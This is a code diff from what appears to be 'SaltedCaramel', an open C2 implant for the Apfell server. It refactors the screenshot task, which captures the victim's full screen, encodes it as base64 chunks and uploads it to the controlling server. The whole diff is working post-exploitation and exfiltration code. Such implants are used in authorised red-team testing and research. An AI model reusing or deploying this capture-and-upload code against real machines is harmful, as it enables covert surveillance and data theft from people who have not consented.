@@ -5,6 +5,7 @@ using System.Drawing;
 using System.IO;
 using System.Windows.Forms;
 using Apfell.Structs;
+using SaltedCaramel.Jobs;
 
 /// <summary>
 /// This task will capture a screenshot and upload it to the Apfell server
@@ -13,8 +14,9 @@ namespace SaltedCaramel.Tasks
 {
     public class ScreenCapture
     {
-        public static void Execute(SCTask task, SCImplant implant)
+        public static void Execute(Job job, SCImplant implant)
         {
+            SCTask task = job.Task;
             Rectangle bounds = Screen.GetBounds(Point.Empty);
             Bitmap bm = new Bitmap(bounds.Width, bounds.Height);
             Graphics g = Graphics.FromImage(bm);
@@ -39,7 +41,8 @@ namespace SaltedCaramel.Tasks
                 // Number of chunks will always be one for screen capture task
                 // Receive file ID in response
                 SCTaskResp initial = new SCTaskResp(task.id, "{\"total_chunks\": " + 1 + ", \"task\":\"" + task.id + "\"}");
-                DownloadReply reply = JsonConvert.DeserializeObject<DownloadReply>(implant.Profile.PostResponse(initial));
+
+                DownloadReply reply = JsonConvert.DeserializeObject<DownloadReply>(implant.TryGetPostResponse(initial));
                 Debug.WriteLine($"[-] SendCapture - Received reply, file ID: " + reply.file_id);
 
                 // Convert chunk to base64 blob and create our FileChunk
@@ -52,11 +55,11 @@ namespace SaltedCaramel.Tasks
                 // Receive status in response
                 SCTaskResp response = new SCTaskResp(task.id, JsonConvert.SerializeObject(fc));
                 Debug.WriteLine($"[+] SendCapture - CHUNK SENT: {fc.chunk_num}");
-                string postReply = implant.Profile.PostResponse(response);
+                string postReply = implant.TryGetPostResponse(response);
                 Debug.WriteLine($"[-] SendCapture - RESPONSE: {implant.Profile.PostResponse(response)}");
 
                 // Tell the Apfell server file transfer is done
-                implant.Profile.SendComplete(task.id);
+                implant.TrySendComplete(task.id);
             }
             catch (Exception e) // Catch exceptions from HTTP requests
             {
